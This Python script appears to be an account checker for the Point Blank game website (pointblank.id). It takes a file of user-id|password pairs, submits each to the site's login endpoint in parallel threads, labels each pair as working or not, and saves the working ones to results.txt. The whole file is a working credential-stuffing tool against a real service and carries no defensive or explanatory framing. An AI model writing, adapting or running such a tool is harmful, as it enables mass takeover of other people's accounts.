C0 = "\033[0;36m"
C1 = "\033[1;36m"
G0 = "\033[0;32m"
G1 = "\033[1;32m"
W0 = "\033[0;37m"
W1 = "\033[1;37m"
R0 = "\033[0;31m"
R1 = "\033[1;31m"

import requests, os, sys
from multiprocessing.pool import ThreadPool 
from bs4 import BeautifulSoup 

def cek(up):
	try:
		web=requests.post('https://www.pointblank.id/login/process',data={'loginFail':'0','userid':up.split('|')[0],'password':up.split('|')[1]})

		if 'tidak sesuai' in web.text:
			print(up,'salah')
		else:
			
			r = requests.get('https://www.pointblank.id/game/profile') 
			print(up,'benar')
			soup = BeautifulSoup (r.content, "html.parser") 
			usernameDiv = soup.find("p", class_="level") 
			print("Username: " + usernameDiv.getText()) 
			open('results.txt','a+').write(up+'\n')
			
			
	except:
		pass

try:
	os.system('clear')
	
	ThreadPool(2).map(cek,open(sys.argv[1]).read().splitlines())
	print ("Hello, World!")
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] %sCheck internet'%(W1,R1,W1,W0))
except IndexError:
	exit('%s[%s!%s] %sUse : python2 %s target.txt \n%s[%s!%s] %sFill in target.txt as follows user-id|password'%(W1,R1,W1,W0,sys.argv[0],W1,R1,W1,W0))
except IOError:
	exit('%s[%s!%s] %sFile does not exist'%(W1,R1,W1,W0))
except KeyboardInterrupt:
	exit('\n%s[%s!%s] %sExit'%(W1,R1,W1,W0))
